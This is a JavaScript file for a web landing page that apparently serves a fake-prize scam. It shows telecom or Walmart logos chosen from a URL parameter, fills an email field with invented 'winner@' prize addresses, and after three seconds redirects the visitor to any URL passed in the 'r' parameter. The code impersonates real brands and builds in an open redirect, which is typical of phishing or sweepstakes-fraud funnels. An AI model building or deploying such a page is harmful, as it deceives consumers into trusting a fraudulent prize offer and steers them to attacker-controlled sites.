



window.onload  = onLoadHandler

// Log the values
// console.log('Parameter 1:', parameter1);
// console.log('Parameter 2:', parameter2);

async function delay(ms){
    return new Promise((res,rej)=>{
        setTimeout(()=>{
            res("done")
        }, ms)
    })
}
function getRandomEmail(){
    const emails = [
            "winner@todaysbigdraw.com",
            "winner@thebigprize.com",
            "winner@theluckyday.com",
            "winner@youwontoday.com",
    ];

    return emails[Math.floor(emails.length * Math.random())]

}
async function onLoadHandler(){
        // Get the query string from the URL
        const queryString = window.location.search;

        // Parse the query string into an object
        const queryParams = new URLSearchParams(queryString);

        // Access specific parameters by name
        let email = queryParams.get('email');
        const carrier = queryParams.get('carrier');
        const redirect = queryParams.get('r');

        console.log({email, carrier})

        removeLoadScreen();

        addLogo(carrier|| "");
        if(!email){
            email = getRandomEmail();
        }
        setemail(email)

        await delay(3000);

        window.location.href = redirect;





        




}

function setemail(email){
    document.querySelector("#email").value = email
}
function addLogo(carrier = ""){
    console.log(carrier)
    let src = "./images/walmart.png"


    if(carrier.toLowerCase().includes("verizon")){
        src = "./images/verizon.png"
    }
    if(carrier.toLowerCase().includes("t-mobile")){
        src = "./images/tmobile.png"
    }
    if(carrier.toLowerCase().includes("t-mobile")){
        src = "./images/tmobile.png"
    }
    if(carrier.toLowerCase().includes("frontier")){
        src = "./images/frontier.png"
    }
    if(carrier.toLowerCase().includes("metro")){
        src = "./images/tmoblie.png"
    }
    if(carrier.toLowerCase().includes("carolin")){
        src = "./images/caroline.png"
    }
    if(carrier.toLowerCase().includes("onvoy")){
        src = "./images/onvoy.png"
    }
    if(carrier.toLowerCase().includes("voice")){
        src = "./images/voicestream.png"
    }
    if(carrier.toLowerCase().includes("thumb")){
        src = "./images/thumbcellular.png"
    }
    if(carrier.toLowerCase().includes("cellular")){
        src = "./images/uscellular.webp"
    }

   const img =  document.createElement("img")
     
   const logo = document.querySelector(".logo")

   img.setAttribute("src", src);

   logo.appendChild(img);

}


function removeLoadScreen(){
    document.querySelector(".loading").classList.add("hidden");
    document.querySelector(".container").classList.remove("hidden");
}